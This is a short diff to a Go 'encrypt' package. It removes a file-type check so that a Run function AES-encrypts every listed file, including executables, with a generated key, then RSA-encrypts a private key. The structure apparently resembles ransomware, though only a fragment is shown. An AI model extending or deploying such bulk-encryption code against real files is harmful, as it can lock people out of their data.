@@ -1,7 +1,6 @@
 package encrypt
 
 import (
-	"../fileAnalysis"
 	"bufio"
 	"bytes"
 	"crypto/aes"
@@ -12,7 +11,6 @@ import (
 	"encoding/base64"
 	"encoding/pem"
 	"errors"
-	"fmt"
 	"os"
 	"path/filepath"
 )
@@ -269,11 +267,7 @@ func Run(filename []string) {
 	key, _ := GenAesKey()
 
 	for _, _file := range filename {
-		fileType := fileAnalysis.GetFileType(_file)
-		fmt.Println(_file, fileType)
-		if fileType != "exe" {
-			AesEncryptFile(_file, key)
-		}
+		AesEncryptFile(_file, key)
 	}
 
 	data1, _ := RsaEncrypt(private_Key2, public_Key1)
